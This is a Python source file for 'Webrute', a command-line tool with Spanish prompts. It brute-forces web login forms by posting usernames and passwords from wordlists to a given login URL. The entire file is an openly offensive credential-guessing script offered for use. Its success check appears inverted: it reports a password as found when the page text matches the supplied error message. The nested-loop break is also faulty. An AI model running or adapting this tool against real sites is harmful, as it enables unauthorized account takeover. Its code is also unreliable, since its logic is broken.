import requests
import random
from bs4 import BeautifulSoup
import os
print("""
 _______________________________________
|               \033[34mW\033[31me\033[33mb\033[34mr\033[32mu\033[31mte\033[0m                 |
|_______________________________________|
|---------------beta-1.0----------------|
| #echo por : cave02                    |
| #github   : https://github.com/cave02 |
| #echo en  : python                    |
|                                       |
|_______________________________________|
|_______________________________________|
\033[0m""")
l = input("\033[32;1mConoces el nombre de usuario?(S/N) \033[0m")

def dic():
	url = input("[*] link de la pagina inicio de session : ")
	username= input("[*] usuario : ")
	pu = input("[*] tag de usuario(no usuario) : ")
	pt = input("[*] tag de contraseña : ")
	error = input("[*] error : ")
	wordlist = input("[*] lista : ")
	def send(username,pt,pu,error,url,wordlist):
		print()
		with open(wordlist,"r") as n:
			for line in n:
				os.system("clear")
				print(""" _______________________________________
|               \033[34mW\033[31me\033[33mb\033[34mr\033[32mu\033[31mte\033[0m                 |
|_______________________________________|
|---------------beta-1.0----------------|
| #echo por : cave02                    |
| #github   : https://github.com/cave02 |
| #echo en  : python                    |
|                                       |
|_______________________________________|
|_______________________________________|
\033[0m""")
				password = line.strip()		
				ez = requests.post(url,data = {
				
					pu : username,
					pt : password
						
						})
				lol = BeautifulSoup(ez.content, "html.parser").get_text() 
				print(lol)
				if error != lol :
					print("[*] intentando : "+str(username)+" ==> "+str(password))
				else :
					print()
					print("[+] contraseña : "+str(password))
					break
	send(username,pt,pu,error,url,wordlist)


def n():
	url = input("[*] link de la pagina inicio de session : ")
	userlist = input("[*] usuario lista : ")
	pu = input("[*] tag de usuario(no usuario) : ")
	pt = input("[*] tag de contraseña : ")
	error = input("[*] error : ")
	wordlist = input("[*] lista : ")
	def send(userlist,pt,pu,error,url,wordlist):
		print()
		with open(wordlist,"r") as n:
			for line in n:
				os.system("clear")
				print(""" _______________________________________
|               \033[34mW\033[31me\033[33mb\033[34mr\033[32mu\033[31mte\033[0m                 |
|_______________________________________|
|---------------beta-1.0----------------|
| #echo por : cave02                    |
| #github   : https://github.com/cave02 |
| #echo en  : python                    |
|                                       |
|_______________________________________|
|_______________________________________||
\033[0m""")
				password = line.strip()
				with open(userlist,"r") as us:		
					for l in us:
						username = l.strip()
						ez = requests.post(url,data = {
						
							pu : username,
							pt : password
								
								})
						lol = BeautifulSoup(ez.content, "html.parser").get_text() 
						print(lol)
						if error != lol :
							print("[*] intentando : "+str(username)+" ==> "+str(password))
						else :
							print()
							print("[+] usuario    : "+str(username))
							print("[+] contraseña : "+str(password))
							break
	send(userlist,pt,pu,error,url,wordlist)

if l == "s":
	dic()
elif l == "S":
	dic()
else :
	n()
